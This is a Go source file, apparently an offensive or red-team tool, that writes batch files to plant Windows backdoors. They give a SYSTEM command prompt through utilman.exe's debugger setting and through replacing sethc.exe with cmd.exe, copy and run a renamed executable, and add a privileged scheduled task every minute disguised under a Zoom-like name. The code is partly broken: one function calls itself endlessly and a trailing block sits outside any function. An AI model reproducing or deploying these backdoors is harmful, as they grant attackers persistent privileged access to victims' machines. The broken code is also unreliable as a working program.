package main

import (
	"C"
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
)

//two kinds of options, can do this in a batch, or can do this in a full run.

func batchRun() {
	//utilman backdoor & reg touch
	batString2 := "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /f /v Debugger /t REG_SZ /d \"%windir%\\system32\\cmd.exe\""
	f2, _ := os.Create("c:\\Windows\\System32\\netlogin.bat")
	defer f2.Close()
	f2.WriteString(batString2)
	batchRun()
	defer exec.Command("c:\\Windows\\system32\\netlogin.bat")
}

func directRun() {
	cmd2 := exec.Command("c:\\ProgramData\\mjfy.cmd") // what am I going to do about this? Compile it in right?
	cmd2.SysProcAttr = &syscall.SysProcAttr{

		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	if err := cmd2.Start(); err != nil {
		log.Printf("Failed proc launch cmd2.")
		return
	}

}

func main() {
	mode := os.Args[1]
	fmt.Println("BeepBoop Meow Meow")
	fmt.Println("Starting the application...")
	switch mode {
	case "file":
		batchRun()
	case "direct":
		directRun()
	}

}



//extra for now
//utilman backdoor
batString2 := "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /f /v Debugger /t REG_SZ /d \"%windir%\\system32\\cmd.exe\""
f2, _ := os.Create("c:\\Windows\\System32\\netlogin.bat")
defer f2.Close()
f2.WriteString(batString2)

//backdoor
batString3 := "copy c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe"
f3, _ := os.Create("c:\\Users\\Public\\chtes.bat")
defer f3.Close()
f3.WriteString(batString3)
//backdoor
cwd, err := os.Getwd()
if err != nil {
	fmt.Printf("cwd failed")
}
batString4 := "copy " + cwd + "\\catinwindow4.exe c:\\Windows\\SysWOW64\\ironcatwuzhere.exe && c:\\Windows\\SysWOW64\\ironcatwuzhere.exe meow"
f4, _ := os.Create("c:\\Windows\\SysWOW64\\launch.bat")
defer f4.Close()
f4.WriteString(batString4)

batString5 := "SCHTASKS /CREATE /SC MINUTE /TN ZOOM\\IAMNOTACAT /TR c:\\Windows\\Fonts\\potts.bat /RL HIGHEST"
f5, _ := os.Create("c:\\Windows\\System32\\pepper.bat")
defer f5.Close()
f5.WriteString(batString5)